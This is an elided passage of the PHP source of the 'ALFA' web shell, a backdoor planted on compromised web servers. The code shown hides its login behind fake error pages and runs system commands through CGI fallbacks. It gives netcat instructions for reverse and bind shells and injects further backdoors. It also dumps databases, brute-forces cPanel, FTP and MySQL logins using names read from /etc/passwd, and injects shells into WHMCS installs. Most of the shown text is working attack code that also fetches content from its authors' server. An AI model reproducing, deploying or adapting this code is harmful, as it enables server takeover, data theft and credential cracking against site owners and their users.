...
if (!function_exists('阿尔法功能启动')) {
    ...
    function 阿尔法功能启动($arg1)
    {
        ...
        $orig_file = dirname(__FILE__) . '/alfa3.php';
...
define('__ALFA_VERSION__', '3.0.0');
define('__LAST_CWD__', 'last_cwd_' . __ALFA_MD5NAME__);
define('__PATH_HISTORY__', 'path_history_' . __ALFA_MD5NAME__);
define('__ALFA_POST_ENCRYPTION__', (
    isset($GLOBALS['DB_NAME']['post_encryption']) &&
    true == $GLOBALS['DB_NAME']['post_encryption']
...
if ($config['AlfaProtectShell']) {
    ...
    } elseif ('500' == $config['AlfaLoginPage']) {
    ...
    } elseif ('403' == $config['AlfaLoginPage']) {
        if ($_SESSION['AlfaPass'] != md5($config['AlfaPass'])) {
            if (md5($_POST['password']) == $config['AlfaPass']) {
                $_SESSION['AlfaUser'] = $config['AlfaUser'];
                $_SESSION['AlfaPass'] = md5($config['AlfaPass']);
    ...
    } elseif ('404' == $config['AlfaLoginPage']) {
        if ($_SESSION['AlfaPass'] != md5($config['AlfaPass'])) {
            if (md5($_POST['password']) == $config['AlfaPass']) {
                $_SESSION['AlfaUser'] = $config['AlfaUser'];
                $_SESSION['AlfaPass'] = md5($config['AlfaPass']);
...
function _alfa_cgicmd($cmd, $lang = 'perl')
{
    ...
    if ($is_curl || $is_socket) {
        ...
        if ($is_curl) {
            $address = (443 == $_SERVER['SERVER_PORT'] ? 'https://' : 'http://') . $_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']) . '/alfacgiapi/' . $lang . '.alfa';
            $post = new AlfaCURL();
...
function alfaEx($in, $re = false, $cgi = true, $all = false)
{
    ...
    if (empty($data) && $cgi || $all) {
        if ('unix' == $GLOBALS['sys']) {
            if (0 == strlen(_alfa_php_cmd('whoami')) || $all) {
                $cmd = _alfa_cgicmd($in);
                if (!empty($cmd)) {
                    return $cmd;
                }
...
$GLOBALS['cwd'] = (isset($_SESSION[__LAST_CWD__]) &&
...
{
    echo 
        isset($_SESSION[__PATH_HISTORY__]) && !empty($_SESSION[__PATH_HISTORY__])
        ? $_SESSION[__PATH_HISTORY__]
        : $GLOBALS['home_cwd'];
}
...
function alfahead()
{
    ...
    if (!isset($_POST['ajax'])) {
        ...
        echo 'function fc(a){alfaloader("block");var b="a="+alfab64("FilesMan")+"&c="+alfab64(a.c.value)+"&alfa1="+alfab64(a.alfa1.value)+"&ajax="+alfab64("true")+"&",c="";for(i=0;i<d.files.elements.length;i++)"checkbox"==d.files.elements[i].type&&d.files.elements[i].checked&&(c+="f[]="+alfab64(d.files.elements[i].value)+"&");_Ajax(d.URL,b+c,function(a){alfaloader("none")},!0)}
        
        function initDir(a){var b="",c="";islinux&&(b="<a class=\"header_pwd\" onclick=\"g(\'FilesMan\',\'/\');\" href=\'javascript:void(0);\'>/</a>",c="/");var e=a.split("/"),f="",g="";"-1"!=e.indexOf("..")&&(e.splice(e.indexOf("..")-1,1),e.splice(e.indexOf(".."),1));for(i in e)""!=e[i]&&(f+="<a onclick=\"g(\'FilesMan\',\'"+g+e[i]+"/\');\" href=\'javascript:void(0);\' class=\"header_pwd\">"+e[i]+"/</a>",g+=e[i]+"/");$("header_cwd").innerHTML=b+f+" ";var e=c+e.join("/");e=e.replace("//","/"),d.footer_form.c.value=e,$("footer_cwd").value=e,c_=e}
        
        function evalJS(html){var newElement=document.createElement("div");newElement.innerHTML=html;for(var scripts=newElement.getElementsByTagName("script"),i=0;i<scripts.length;++i){var script=scripts[i];eval(script.innerHTML)}}
        
        function _Ajax(a,b,c,e){var f=!1;return window.XMLHttpRequest?f=new XMLHttpRequest:window.ActiveXObject&&(f=new ActiveXObject("Microsoft.XMLHTTP")),f?(f.onreadystatechange=function(){4==f.readyState&&200==f.status&&("function"!=typeof c?d.getElementsByClassName("ajaxarea")[0].innerHTML=f.responseText:e?(d.getElementsByClassName("ajaxarea")[0].innerHTML=f.responseText,c(f.responseText)):c(f.responseText))},f.open("POST",a,!0),f.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),f.send(b),void 0):void alert("Error !")}
        
        function handleup(a,b){var c="__fnameup";0!=b&&(c="__fnameup"+b),a.files[0].name&&($(c).innerHTML=a.files[0].name)}
        
        function u(a){alfaloader("block");a.submit.disabled=true;var av = a.a.value,cv = a.c.value,alv = a.alfa1.value,cha = a.charset.value;var b=!1;if(a.a.value=alfab64(a.a.value),a.c.value=alfab64(a.c.value),a.alfa1.value=alfab64(a.alfa1.value),a.charset.value=alfab64(a.charset.value),window.XMLHttpRequest?b=new XMLHttpRequest:window.ActiveXObject&&(b=new ActiveXObject("Microsoft.XMLHTTP")),b){var c=$("up_bar");b.upload&&(c.style.display="block",b.upload.onprogress=function(a){var b=a.position||a.loaded,d=a.totalSize||a.total,e=Math.floor(b/d*1e3)/10+"%";c.style.width=e}),b.onload=function(e){for(200===b.status?(_Ajax(d.URL,"a="+alfab64("FilesMan")+"&c="+a.c.value+"&ajax="+alfab64("true")),c.style.display="none",a.a.value=av,a.c.value=cv,a.alfa1.value=alv,a.charset.value=cha):alert("An error occurred!"),$("footerup").value="",$("__fnameup").innerHTML="";upcount;){var f=$("pfooterup_"+upcount);f&&f.parentNode.removeChild(f),upcount--}0==upcount&&upcount++,alfaloader("none"),a.submit.disabled=false},b.onerror=function(a){};var e=new FormData(a);b.open("POST",d.URL),b.send(e)}}
        
        function g(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset){set(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset),"GetConfig"!=a&&"download"!=alfa2&&(d.getElementsByClassName("ajaxarea")[0].innerHTML=\'<center><br /><img id="alfaloader" src="' . __showicon('loader') . '"></img><br /><br /></center>\'),islinux&&"/"!=d.mf.c.value.substr(0,1)&&(d.mf.c.value="/"+d.mf.c.value);for(var data="a="+alfab64(a)+"&c="+alfab64(d.mf.c.value)+"&",i=1;i<=10;i++)data+="alfa"+i+"="+alfab64(eval("d.mf.alfa"+i+".value"))+"&";if(data+="&ajax="+alfab64("true"),"FilesTools"==a&&"download"==alfa2){var dl=$("dlForm");return dl.a.value=alfab64("dlfile"),dl.c.value=alfab64(d.mf.c.value),dl.file.value=alfab64(alfa1),void dl.submit()}"GetConfig"!=a?(_Ajax(d.URL,data),c!=c_&&c&&initDir(c)):(alfaloader("block"),_Ajax(d.URL,data,function(a){try{a=JSON.parse(a),a.host&&a.user&&a.dbname&&($("db_host")&&($("db_host").value=a.host),$("db_user")&&($("db_user").value=a.user),$("db_name")&&($("db_name").value=a.dbname),$("db_pw")&&($("db_pw").value=a.password),$("db_prefix")&&a.prefix&&($("db_prefix").value=a.prefix),$("cc_encryption_hash")&&a.cc_encryption_hash&&($("cc_encryption_hash").value=a.cc_encryption_hash))}catch(a){}alfaloader("none")}))}
        
        function alfaloader(a){$("a_loader").style.display=a}
        
        function fsu(a){alfaloader("block");for(var b={},c=0;c<a.elements.length;c++)"submit"!=a.elements[c].type&&(b[a.elements[c].name]=a.elements[c].value);for(c in mysql_cache)mysql_cache[c]=alfab64(mysql_cache[c]);_Ajax(d.URL,"a="+alfab64("Sql")+"&alfa1="+alfab64("update")+"&alfa2="+alfab64(JSON.stringify(b))+"&c="+alfab64(c_)+"&charset="+mysql_cache.charset+"&type="+mysql_cache.type+"&sql_host="+mysql_cache.host+"&sql_login="+mysql_cache.user+"&sql_pass="+mysql_cache.pass+"&sql_base="+mysql_cache.db+"&sql_count="+mysql_cache.count+"&ajax="+alfab64("true"),function(a){evalJS(a),alfaloader("none")},!0)}
        
        function fs(f,e){alfaloader("block");var alfa1="query",alfa2=f.query?alfab64(f.query.value):"",host=f.sql_host?f.sql_host.value:mysql_cache.host,user=f.sql_login?f.sql_login.value:mysql_cache.user,pass=f.sql_pass?f.sql_pass.value:mysql_cache.pass,db=f.sql_base?f.sql_base.value:mysql_cache.db,type=f.type?f.type.value:mysql_cache.type,charset=f.charset?f.charset.value:mysql_cache.charset,count="";switch(count=f.sql_count?f.sql_count.checked?"true":"":mysql_cache.count,f){case"0":alfa1="select",alfa2=alfab64(e);break;case"1":e=eval(e),alfa1="select",alfa2=alfab64(e[0])+"&alfa3="+alfab64(e[1]);break;case"2":e=eval(e),alfa1="edit",alfa2=alfab64(db)+"&alfa3="+alfab64(e.join(":"));break;case"3":alfa1="loadfile",alfa2=alfab64(e);break;case"4":case"5":alfa1=(f=="4"?"dumpfile":"droptbl");var obj={},id=$("dumpfile");for(obj.file=id?id.value:"dump.sql",obj.tbl=[],i=0;i<d.sf.elements["tbl[]"].length;++i)d.sf.elements["tbl[]"][i].checked&&obj.tbl.push(d.sf.elements["tbl[]"][i].value);alfa2=alfab64(JSON.stringify(obj))}_Ajax(d.URL,"a="+alfab64("Sql")+"&alfa1="+alfab64(alfa1)+"&alfa2="+alfa2+"&c="+alfab64(c_)+"&charset="+alfab64(charset)+"&type="+alfab64(type)+"&sql_host="+alfab64(host)+"&sql_login="+alfab64(user)+"&sql_pass="+alfab64(pass)+"&sql_base="+alfab64(db)+"&sql_count="+alfab64(count)+"&ajax="+alfab64("true"),function(a){evalJS(a),alfaloader("none")},!0)}
        
        function ctlbc(a){var b=$("bcStatus"),c=$("bcipAction");"bind"==a.value?(c.style.display="none",b.innerHTML="<small>Press ` <font color=\'red\'>>></font> ` button and run ` <font color=\'red\'>nc server_ip port</font> ` on your computer</small>"):(c.style.display="inline-block",b.innerHTML="<small>Run ` <font color=\'red\'>nc -l -v -p port</font> ` on your computer and press ` <font color=\'red\'>>></font> ` button</small>")}
        
        function is(){for(i=0;i<d.sf.elements["tbl[]"].length;++i)d.sf.elements["tbl[]"][i].checked=!d.sf.elements["tbl[]"][i].checked
        
        }function $(a){return d.getElementById(a)}
        
        function addnewup(){var a="footerup_"+upcount,b="pfooterup_"+upcount,c=1!=upcount?"pfooterup_"+(upcount-1):"pfooterup",e=d.createElement("p");e.innerHTML=\'<label class="inputfile" for="\'+a+\'"><span id="__fnameup\'+upcount+\'"></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id="\'+a+\'" type="file" name="f[]" onChange="handleup(this,\'+upcount+\');">\',e.id=b,e.appendAfter($(c)),upcount++}
        
        function alfa_searcher_tool(a){switch(a){case"all":case"dirs":_alfaSet(!0,"Disabled");break;case"files":_alfaSet(!1,"php")}}
        
        function _alfaSet(a,b){d.srch.ext.disabled=a,d.srch.ext.value=b}
        
        function dis_input(a){switch(a){case"phpmyadmin":bruteSet(!0,"Disabled","http://");break;case"direct":bruteSet(!1,"2222","http://");break;case"cp":bruteSet(!1,"2082","http://");break;case"ftp":bruteSet(!0,"Disabled","ftp://");break;case"mysql":bruteSet(!1,"3306","http://");break;case"ftpc":bruteSet(!1,"21","http://")}}
            
            function bruteSet(a,b,d){"21"!=b?c="localhost":c="ftp.example.com",$("port").disabled=a,$("port").value=b,$("target").value=c,$("protocol").value=d}Element.prototype.appendAfter=function(a){a.parentNode.insertBefore(this,a.nextSibling)};function inBackdoor(t){if(t.value=="my"){$("backdoor_textarea").style.display="block";}else{$("backdoor_textarea").style.display="none";}}
            
            function saveByKey(e){return!("s"==String.fromCharCode(e.which).toLowerCase()&&e.ctrlKey||19==e.which)||($("editor_edit_area").onsubmit(),e.preventDefault(),!1)}
            
            function setCookie(e,i,t){var l=new Date;l.setTime(l.getTime()+24*t*60*60*1e3);var o="expires="+l.toUTCString();document.cookie=e+"="+i+";"+o+";path=/"}
            
            function getCookie(e){var i=("; "+document.cookie).split("; "+e+"=");if(2==i.length)return i.pop().split(";").shift()}
            
            function editorClose(e){d.body.style.overflow="visible",elem=$(e),elem.setAttribute("class","editor-anim-close"),"editor"==e?is_minimized=!1:cgi_is_minimized=!1,setTimeout(function(){elem.removeAttribute("class"),elem.style.display="none"},1e3),d.body.style.overflow="visible"}
            
            function showEditor(e){$(e).setAttribute("class","editor-anim-show"),$(e+"-minimized").setAttribute("class","minimized-hide"),"editor"==e?(is_minimized=!1,cgi_is_minimized&&($("cgiloader-minimized").style.top="30%")):(cgi_is_minimized=!1,is_minimized&&($("editor-minimized").style.top="30%")),d.body.style.overflow="hidden"}
            
            function editorMinimize(e){$(e).setAttribute("class","editor-anim-minimize"),$(e+"-minimized").setAttribute("class","minimized-show"),"editor"==e?(is_minimized=!0,cgi_is_minimized?($("cgiloader-minimized").style.top="20%",$("editor-minimized").style.top="50%"):$("editor-minimized").style.top="30%"):(cgi_is_minimized=!0,is_minimized?($("cgiloader-minimized").style.top="20%",$("editor-minimized").style.top="50%"):$("cgiloader-minimized").style.top="30%"),d.body.style.overflow="visible"}
            
            function clearEditorHistory(){if(confirm("Are u Sure?"))for(var e in editor_files)e!=editor_current_file&&removeHistory(e)}
            
            function editor(e,i,t,l,o,a){if("dir"==a&&".."==e)return!1;if("download"==i)return g("FilesTools",l,e,"download"),!1;var r="",n="",s="",f=d.mf.c.value,c=!0;if(e=e.trim(),0==Object.keys(editor_files).length){var m=getCookie("alfa_history_files");try{editor_files=JSON.parse(m);for(var u in editor_files)insertToHistory(u,editor_files[u].file,0,editor_files[u].type)}catch(e){}}if(-1!=e.indexOf("/")){var p=e.split("/");e=p[p.length-1],delete p[p.length-1],f=p.join("/"),islinux&&(f="/"+f)}void 0===a&&(a=""),void 0!==l&&null!=l&&0!=l.length&&(f=l.trim());try{for(var v in editor_files)if(editor_files[v].file==decodeURIComponent(e)&&editor_files[v].pwd.replace(/\//g,"")==f.replace(/\//g,"")){c=!1,o=v;break}}catch(e){console.log(e)}if(editor_error=!0,void 0!==t&&0!=t.length&&null!=t&&(r=alfab64(t)),void 0!==o&&null!=o&&0!=o.length)n=alfab64(o),s=o;else{var _="file_"+getRandom(10);n=alfab64(_),s=_}return alfaloader("block"),_Ajax(d.URL,"a="+alfab64("FilesTools")+"&c="+alfab64(f)+"&alfa1="+alfab64(e)+"&alfa2="+alfab64(i)+"&alfa3="+r+"&alfa4="+n+"&alfa5=&alfa6=&alfa7=&alfa8=&alfa9=&alfa10=&&ajax="+alfab64("true"),function(t){if(document.querySelector(".editor-content").innerHTML=t,$("editor").style.display="block",alfaloader("none"),evalJS(t),"delete"!=i&&editor_error){var l=d.getElementsByClassName("is_active");0!=l.length&&(l[0].className="file-holder"),n=s,e=decodeURIComponent(e),!editor_files[n]&&c?(editor_files[n]={file:e,pwd:f,type:a},insertToHistory(n,e," is_active",a),"mkfile"==i&&g("FilesMan",null)):$(n).parentNode.className+=" is_active"}d.body.style.overflow="hidden",d.getElementsByClassName("filestools")[0].setAttribute("fid",n),editor_files[n]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[n].pwd+"/"+editor_files[n].file).replace(/\/\//g,"/")),editor_current_file=n,is_minimized&&showEditor("editor"),updateCookieEditor()}),!1}
            
            function insertToHistory(e,i,t,l){var o="";t&&0!=t&&(o=t);var a=document.createElement("div");a.innerHTML="<div id=\'"+e+"\' class=\'history\' onClick=\'reopen(this);\'><div class=\'editor-icon\'>"+loadType(i,l,e)+"</div><div class=\'editor-file-name\'>"+i+"</div></div><div class=\'history-close\' onClick=\'removeHistory(\""+e+"\");\'>X</div>",a.className="file-holder"+o,a.addEventListener("mouseover",function(){setEditorTitle(e,"over"),this.childNodes[1].style.opacity="1"}),a.addEventListener("mouseout",function(){setEditorTitle(e,"out"),this.childNodes[1].style.opacity="0"});var r=d.getElementsByClassName("history-list")[0];r.insertBefore(a,r.firstChild)}
            
            function loadType(e,i,t){"none"==i&&_Ajax(d.URL,"a="+alfab64("checkfiletype")+"&path="+alfab64(editor_files[t].pwd)+"&arg="+alfab64(editor_files[t].file),function(e){$(t).innerHTML="<div class=\'editor-icon\'>"+loadType(editor_files[t].file,e,t)+"</div><div class=\'editor-file-name\'>"+editor_files[t].file+"</div>",editor_files[t].type=e});return"file"==i?(i=(i=e.split("."))[i.length-1].toLowerCase(),-1==["json","ppt","pptx","xls","xlsx","msi","config","cgi","pm","c","cpp","cs","java","aspx","asp","db","ttf","eot","woff","woff2","woff","conf","log","apk","cab","bz2","tgz","dmg","izo","jar","7z","iso","rar","bat","sh","alfa","gz","tar","php","php4","php5","phtml","html","xhtml","shtml","htm","zip","png","jpg","jpeg","gif","bmp","ico","txt","js","rb","py","xml","css","sql","htaccess","pl","ini","dll","exe","mp3","mp4","m4a","mov","flv","swf","mkv","avi","wmv","mpg","mpeg","dat","pdf","3gp","doc","docx","docm"].indexOf(i)&&(i="notfound")):i="folder",\'<img src="http://solevisible.com/icons/{type}" width="30" height="30">\'.replace("{type}",i+".png")}
            
                function updateDirsEditor(e,i){var t=d.mf.c.value+"/",l=editor_files[e].pwd+"/"+i+"/",o=editor_files[e].pwd+"/"+editor_files[e].file+"/";l=l.replace(/\/\//g,"/"),o=o.replace(/\/\//g,"/"),-1!=(t=t.replace(/\/\//g,"/")).search(l)&&(initDir(t.replace(l,o)),d.mf.c.value=t.replace(l,o),_Ajax(d.URL,"a="+alfab64("updatepath")+"&path="+alfab64(d.mf.c.value),function(e){console.log(e)}));for(var a in editor_files){var r=editor_files[a].pwd+"/";-1!=(r=r.replace(/\/\//g,"/")).search(l)&&(editor_files[a].pwd=r.replace(l,o))}var n=new RegExp("\'"+l.slice(0,-1)+"\'"),s=new RegExp(i+" \\\|</b></a>");d.files.innerHTML=d.files.innerHTML.replace(n,"\'"+o.slice(0,-1)+"\'"),d.files.innerHTML=d.files.innerHTML.replace(s,editor_files[e].file+" |</b></a>"),updateCookieEditor()}
            
            function updateCookieEditor(){setCookie("alfa_history_files",JSON.stringify(editor_files),2012)}
            
            function setEditorTitle(e,i){"out"==i&&""!=editor_current_file&&(e=editor_current_file),editor_files[e]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[e].pwd+"/"+editor_files[e].file).replace(/\/\//g,"/"))}
            
            function removeHistory(e){delete editor_files[e],$(e)&&$(e).parentNode.parentNode.removeChild($(e).parentNode);var i=d.getElementsByClassName("filestools")[0];i&&i.getAttribute("fid")==e&&(i.outerHTML=""),editor_current_file==e&&(editor_current_file=""),updateCookieEditor()}
            
            function getRandom(e){for(var i="",t="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",l=void 0===e?20:e;l>0;--l)i+=t[Math.floor(Math.random()*t.length)];return i}
            
            function reopen(e){var i=e.getAttribute("id"),t=editor_files[i].pwd;editor(editor_files[i].file,"auto","",t,i)}
            ...
            function encrypt(e,i){if(null==i||i.length<=0)return null;e=alfab64(e,!0),i=alfab64(i,!0);for(var t="",l="",o=0;o<e.length;)for(var a=0;a<i.length&&(t=e.charCodeAt(o)^i.charCodeAt(a),l+=String.fromCharCode(t),!(++o>=e.length));a++);return alfab64(l,!0)}
            
            function reloadSetting(e){return alfaloader("block"),_Ajax(d.URL,"a="+alfab64("settings")+"&alfa1="+alfab64(e.protect.value)+"&alfa2="+alfab64(e.lgpage.value)+"&alfa3="+alfab64(e.username.value)+"&alfa4="+alfab64(e.password.value)+"&alfa5="+alfab64(">>")+"&alfa6="+alfab64(e.icon.value)+"&alfa7="+alfab64(e.post_encrypt.value)+"&alfa8="+alfab64("main")+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),function(e){evalJS(e),alfaloader("none")},!0),0==e.e.value&&1==e.protect.value&&setTimeout("location.reload()",1e3),e.s.value!=e.icon.value&&setTimeout("location.reload()",1e3),!1}
            
            function reloadColors(e){var i={};void 0===e?d.querySelectorAll(".colors_input").forEach(function(e){var t=e.getAttribute("target").replace(".","");i[t]=e.value}):i=e,alfaloader("block");var t=$("use_default_color").checked?"1":"0";_Ajax(d.URL,"a="+alfab64("settings")+"&alfa1="+alfab64(JSON.stringify(i))+"&alfa2="+alfab64(">>")+"&alfa3="+alfab64(t)+"&alfa8="+alfab64("color")+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),function(e){alfaloader("none"),evalJS(e)},!0)}
            
            function alfab64(e,i){return void 0!==i||0==post_encryption_mode?window.btoa(unescape(encodeURIComponent(e))):encrypt(e,"' . _AlfaSecretKey() . '")}
            
            function evalCss(e){var i=document.createElement("style");i.styleSheet?i.styleSheet.cssText=e:i.appendChild(document.createTextNode(e)),d.getElementsByTagName("head")[0].appendChild(i)}
            
            function colorHandlerKey(e){setTimeout(function(i){colorHandler(e)},200)}
            
            function colorHandler(e){var t=e.getAttribute("target"),l=e.getAttribute("multi"),o=t.indexOf(":hover");if(l){var a=JSON.parse(atob(l)),r="";for(i in a.multi_selector)r+=i+"{"+a.multi_selector[i].replace(/{color}/g,e.value)+"}";evalCss(r)}-1==o||l?($("input_"+t.replace(".","")).value=e.value,$("gui_"+t.replace(".","")).value=e.value,".header_values"==t&&(t=".header,.header_values"),d.querySelectorAll(t).forEach(function(i){i.style.color=e.value})):($("input_"+t.replace(".","")).value=e.value,$("gui_"+t.replace(".","")).value=e.value,evalCss(t+"{color: "+e.value+";}"))}
            
            function importConfig(e){var i=e.target,t=new FileReader;t.onload=function(){var e=t.result;try{reloadColors(JSON.parse(e))}catch(e){alert("Config is invalid...!")}$("importFileBtn").value=""},t.readAsText(i.files[0])}
            
            function checkBox(){for(i=0;i<d.files.elements.length;i++)"checkbox"==d.files.elements[i].type&&(d.files.elements[i].checked=d.files.elements[0].checked)}
            
            function path_history(e){_Ajax(d.URL,"a="+alfab64("GetPathHistory")+"&ajax="+alfab64("true"),function(e){g("FilesMan",e)},!0)}
            
            function runcgi(e){if(cgi_is_minimized&&cgi_lang==e)return showEditor("cgiloader"),!1;_Ajax(d.URL,"a="+alfab64("cgishell")+"&alfa1="+alfab64(e)+"&ajax="+alfab64("true"),function(i){d.body.style.overflow="hidden",$("cgiloader").style.display="block",$("cgiframe").innerHTML=i,cgi_lang=e,cgi_is_minimized&&($("cgiloader-minimized").setAttribute("class","minimized-hide"),setTimeout(function(){$("cgiloader").removeAttribute("class"),is_minimized&&($("editor-minimized").style.top="30%")},1e3))})}';
        ...
        if ('( php_uname ) Function Disabled !' == $uname) {
...
function alfainbackdoor()
{
    ...
    if ('file' == $_POST['alfa1']) {
        ...
        if ('' != $_POST['alfa2'] && '' != $_POST['alfa3'] && '' != $_POST['alfa4']) {
            ...
            $file = $_POST['alfa3'];
            $shell = $_POST['alfa4'];
            $key = str_replace(['"', '\''], '', trim($_POST['alfa5']));
            if ('' == $key) {
                $key = 'alfa';
            }
            if ('my' == $method) {
    ...
    if ('db' == $_POST['alfa1']) {
        ...
        $table = ['td1' => ['color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'],  'td2' => ['color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'],  'td3' => ['color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'],  'td4' => ['color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'],  'td5' => ['color' => 'FFFFFF', 'tdName' => 'Backdoor Loader: ', 'inputName' => 'file', 'inputValue' => $cwd, 'inputSize' => '50', 'placeholder' => true],  'td6' => ['color' => 'FFFFFF', 'tdName' => 'Key: ', 'inputName' => 'key', 'inputValue' => 'alfa', 'inputSize' => '50']];
        create_table($table);
        echo "<p>{$select}</p>";
        echo $textarea;
        ...
        if ('' != $_POST['alfa2'] && '' != $_POST['alfa3'] && '' != $_POST['alfa5'] && '' != $_POST['alfa6']) {
            ...
            $method = $_POST['alfa7'];
            $shell = $_POST['alfa8'];
            $key = str_replace(['"', '\''], '', trim($_POST['alfa9']));
            if ('' == $key) {
                $key = 'alfa';
            }
            if ('my' == $method) {
...
function alfaSettings()
{
    ...
    if ('main' == $_POST['alfa8']) {
        ...
        foreach ($lg_array as $key => $val) {
            $protect_html .= '<option value="' . $key . '" ' . ('1' == $GLOBALS['DB_NAME']['safemode'] ? 'selected' : '') . '>' . $val . '</option>';
        }
        foreach ($lg_array as $key => $val) {
            $icon_html .= '<option value="' . $key . '" ' . ('1' == $GLOBALS['DB_NAME']['show_icons'] ? 'selected' : '') . '>' . $val . '</option>';
        }
        ...
        if ('>>' == $_POST['alfa2']) {
            ...
            $array = '';
            $is_default = isset($_POST['alfa3']) && '1' == $_POST['alfa3'] ? true : false;
            $glob_colors = $GLOBALS['__ALFA_COLOR__'];
            foreach ($glob_colors as $k => $v) {
                if (isset($colors[$k]) && !empty($colors[$k]) && !$is_default) {
                    $v = trim($colors[$k]);
...
function alfaplus()
{
    ...
    if ('news' == $_POST['alfa1'] || 'tools' == $_POST['alfa1']) {
        try {
            $s1 = 'http://solevisible.com/' . ('news' == $_POST['alfa1'] ? 'news.php' : 'tools.php');
    ...
    } elseif ('about' == $_POST['alfa1']) {
        echo __pre() . "<pre><center><img src='http://solevisible.com/images/farvahar-iran.png'><br><br><b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><b><br><br><font color='#00A220'>Shell Coded By Sole Sad & Invisible (ALFA TEaM)</font><br><br><font color='#00A220'>Contact : solevisiblegmail.com</font><br><br><font color='#00A220'>Telegram Channel: solevisible</font><br><br><font color='#FFFFFF'>Skype : ehsan.invisible</font><br><br><font color='#FFFFFF'>Skype : sole.sad</font><br><br><font color='#FF0000'>Persian Gulf For Ever</font><br><br><font color='#FF0000'>Iranian Hackers :)</font><br><br><font color='#FF0000'>Our Friends : Mr.PERSIA , R3veC0der</font><br><br></center></pre><iframe src='tg://resolve?domain=solevisible' frameborder='0' width='0' height='0'></iframe>";
    }
    echo '</div>';
    alfafooter();
}
...
function alfaDumper()
{
    ...
    $table = ['td1' => ['color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'], 'td2' => ['color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'], 'td3' => ['color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'], 'td4' => ['color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'], 'td5' => ['color' => 'FFFFFF', 'tdName' => 'Dump Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']) . 'alfa.sql', 'inputSize' => '50']];
    create_table($table);
...
{
    switch ($method) {case 'cp':return Alfa_CP_Cracker($info);
    break;
...
function alfaCrackers()
{
    ...
    foreach (['cp' => 'Cpanel', 'direct' => 'DirectAdmin', 'ftp' => 'FTP', 'phpmyadmin' => 'PhpMyAdmin[DirectAdmin]', 'mysql' => 'mysql_connect()', 'ftpc' => 'ftp_connect()'] as $key => $val) {
        echo '<option value="' . $key . '">' . $val . '</option>';
    }
    echo '</select> Protocol: <select id="protocol" name="protocol">';
    foreach (['https://', 'http://', 'ftp://'] as $val) {
        echo '<option value="' . $val . '">' . $val . '</option>';
    }
    echo '</select> Website/ip Address: <input id="target" type="text" name="target" value="localhost">Port: <input id="port" type="text" name="port" value="2083"><table width="30%"><td align="center">Users List</td><td align="center">Passwords</td></table>	<textarea placeholder="Users" rows="20" cols="25" name="usernames">' . ('unix' == $GLOBALS['sys'] ? alfaEx('cut -d: -f1 /etc/passwd') : '') . '</textarea>&nbsp <textarea placeholder="Passwords" rows="20" cols="25" name="passwords"></textarea><br><br>Save Result Into File <input type="text" name="fcrack" value="cracked.txt"><p><input type="submit" name="cracking" value=" " /></div></form></p><center>';
    ...
    $p = 'phpmyadmin' == $loginpanel ? $p = true : false;
    if ('start' == $cracking) {
        echo __pre();
        $exuser = explode("\n", $usernames);
        $expw = explode("\n", $passwords);
        foreach ($exuser as $user) {
            foreach ($expw as $pw) {
                $array = ['username' => trim($user), 'password' => trim($pw), 'port' => trim($port), 'target' => trim($target), 'protocol' => trim($protocol), 'fcrack' => trim($fcrack), 'mysql' => $p];
...
function alfaShellInjectors()
{
    ...
    if (isset($_POST['alfa1']) && 'whmcs' == $_POST['alfa1']) {
        ...
        $table = ['td1' => ['color' => 'FFFFFF', 'tdName' => 'Path WHMCS Url : ', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'],   'td2' => ['color' => 'FFFFFF', 'tdName' => 'Mysql Host : ', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'],   'td3' => ['color' => 'FFFFFF', 'tdName' => 'Db Name : ', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'],   'td4' => ['color' => 'FFFFFF', 'tdName' => 'Db User : ', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'],   'td5' => ['color' => 'FFFFFF', 'tdName' => 'Db Pass : ', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50']];
        create_table($table);
        echo $selector;
        ...
        if (isset($_POST['alfa6'])) {
            ...
            if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($index)) {
                if (filter_var($path, FILTER_VALIDATE_URL)) {
                    ...
                    $create = "insert into tblclients (email) values('solevisiblefbi.gov')";
                    $result2 = mysqli_query($conn, $create) or die(mysqli_error($conn));
                    if (function_exists('curl_version') && 'auto' == $method) {
                        $AlfaSole = new AlfaCURL(true);
                        $saveurl = $AlfaSole->Send($path . '/pwreset.php');
